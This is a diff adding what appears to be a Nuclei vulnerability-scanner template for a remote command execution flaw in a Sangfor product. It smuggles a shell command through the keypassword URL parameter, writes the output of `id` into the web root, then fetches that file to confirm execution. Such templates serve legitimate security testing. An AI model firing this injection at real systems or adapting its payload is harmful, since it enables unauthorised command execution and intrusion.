@@ -1,0 +1,33 @@
+id: Sangfor-session-Rce
+
+info:
+  name: Sangfor-session-Rce
+  author: iSee857
+  severity: critical
+  description: |
+    Sangfor-session-Rce.
+
+http:
+  - id: write-data
+    raw:
+      - |
+        GET /isomp-protocol/protocol/session?keyPath=1&protocol=ssh&keypassword=123456%27%3Bid+%7C+tee+%2Fusr%2Flocal%2Ftomcat%2Fwebapps%2Ffort%2Ftrust%2Fversion%2F{{randstr}}.txt;&sshd=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: read-data
+    raw:
+      - |
+        GET /fort/trust/version/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=.*gid=.*"
+      - type: status
+        status:
+          - 200
